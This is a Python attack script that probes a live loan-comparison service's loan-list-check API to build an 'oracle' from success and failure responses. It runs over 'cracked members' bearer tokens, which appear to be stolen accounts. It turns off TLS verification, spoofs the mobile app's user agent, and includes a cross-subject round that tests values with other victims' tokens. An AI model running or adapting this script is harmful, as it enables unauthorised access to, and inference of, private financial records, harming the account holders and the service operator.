#!/usr/bin/env python3
"""loReqtNo mapper v2 via POST /bigyo/api/bigyo/loan-list-check.

iter-12 map: 36/38 values SUCCESS for subject 01040062401; only 100 and
1000000 FAILed — and BOTH failed identically in iter-10 too, while other
iter-10 FAILs (1, datefmt, huge) flipped to SUCCESS in iter-12. Hypotheses:
  H1 sticky: 100/1000000 collide with hot legacy daebu rows (row-lock
     contention -> JTA rollback) => real (subject,value) discriminator.
  H2 transient: JTA rollbacks are ambient server noise, subject skew
     coincidental => no oracle.

v2 protocol:
  R1 re-probe every historically-F value for the subject (rollbacks are
     clean, re-probing is safe) -> STICKY (F again) vs FLIP (now S).
  R2 neighbourhood characterisation around each F value (+/-1, /10, *10).
  R3 cross-subject: probe the same F values with OTHER members' tokens.
Sticky F values that survive R1+R3 are promoted to oracle candidates.
"""
import csv
import json
import os
import ssl
import time
import urllib.error
import urllib.parse
import urllib.request

import tokstore

HERE = os.path.dirname(os.path.abspath(__file__))
BASE = "https://m.okbigyo.com:9443"
PATH = "/bigyo/api/bigyo/loan-list-check"
PACE = 0.4
BUDGET = int(os.environ.get("LCHK_MAP_BUDGET", "25"))
MAP_CSV = os.path.join(HERE, "lchk_map.csv")

CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE
UA = "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/126 Mobile Safari/537.36/OkBigyo_Android_Mobile/GA_Android"


def log(msg):
    print(f"[{time.strftime('%H:%M:%S')}]", msg, flush=True)


def call(token, value):
    url = BASE + PATH + "?loReqtNo=" + urllib.parse.quote(str(value))
    req = urllib.request.Request(url, data=b"{}", headers={
        "User-Agent": UA, "Content-Type": "application/json",
        "Accept": "*/*", "Authorization": "Bearer " + token})
    try:
        with urllib.request.urlopen(req, timeout=15, context=CTX) as r:
            raw = r.read().decode("utf-8", "replace")
            st = r.status
    except urllib.error.HTTPError as e:
        raw = e.read().decode("utf-8", "replace")
        st = e.code
    except Exception as e:
        return 0, "ERR", repr(e)[:80]
    norm = raw.replace(" ", "")
    if '"result":"SUCCESS"' in norm:
        cls = "S"
    elif '"result":"FAIL"' in norm:
        cls = "F"
    else:
        cls = f"H{st}"
    return st, cls, raw[:160]


def record(subject, value, st, cls, snip):
    new = not os.path.exists(MAP_CSV)
    with open(MAP_CSV, "a", newline="", encoding="utf-8") as f:
        w = csv.writer(f)
        if new:
            w.writerow(["ts", "subject", "value", "http", "cls", "snippet"])
        w.writerow([time.strftime("%FT%TZ", time.gmtime()), subject,
                    value, st, cls, snip])


def history(cls_filter=None):
    rows = []
    if os.path.exists(MAP_CSV):
        with open(MAP_CSV, newline="", encoding="utf-8") as f:
            for r in csv.DictReader(f):
                if cls_filter is None or r.get("cls") == cls_filter:
                    rows.append(r)
    return rows


def main():
    creds = tokstore.load()
    if not creds:
        log("LCHKMAP2 no cracked members")
        return
    log("LCHKMAP2 START")
    by_mob = {c["mobile"]: c for c in creds}

    # historical F values per subject
    fvals = {}
    for r in history("F"):
        fvals.setdefault(r.get("subject", ""), []).append(r["value"])
    if not fvals:
        log("LCHKMAP2 no historical F values")
        return

    # R1: re-probe F values for their subject
    spent = 0
    for mob, vals in fvals.items():
        cr = by_mob.get(mob)
        if not cr:
            continue
        for v in sorted(set(vals)):
            if spent >= BUDGET:
                break
            spent += 1
            st, cls, snip = call(cr["token"], v)
            record(mob, v, st, cls, snip)
            tag = "FLIP->S" if cls == "S" else f"STICKY-F"
            log(f"R1 {mob} {v} -> {cls} {tag}")
            time.sleep(PACE)

    # R2: neighbourhood around the FIRST F value of the primary subject
    prim = next(iter(fvals))
    cr = by_mob.get(prim)
    if cr:
        v0 = int(min(x for x in fvals[prim] if x.isdigit()))
        hoods = [str(x) for x in (v0 - 1, v0 + 1, v0 // 10, v0 * 10,
                                  v0 - 10, v0 + 10) if x > 0]
        hist = {r["value"] for r in history()}
        for v in hoods:
            if spent >= BUDGET or v in hist:
                continue
            spent += 1
            st, cls, snip = call(cr["token"], v)
            record(prim, v, st, cls, snip)
            log(f"R2 {prim} {v} -> {cls}")
            time.sleep(PACE)

    # R3: cross-subject probe of F values with other members' tokens
    others = [c for c in creds if c["mobile"] != prim]
    fv_set = sorted(set(fvals.get(prim, [])))
    for oc in others:
        for v in fv_set:
            if spent >= BUDGET:
                break
            spent += 1
            st, cls, snip = call(oc["token"], v)
            record(oc["mobile"], v, st, cls, snip)
            log(f"R3 {oc['mobile']} {v} -> {cls}")
            time.sleep(PACE)

    # verdict summary over latest observations
    latest = {}
    for r in history():
        latest[(r["subject"], r["value"])] = r["cls"]
    sticky = [(s, v) for (s, v), c in latest.items() if c == "F"]
    log(f"VERDICT latest-F={(sticky)} sticky_count={len(sticky)}")
    log(f"LCHKMAP2 DONE spent={spent}")


if __name__ == "__main__":
    main()
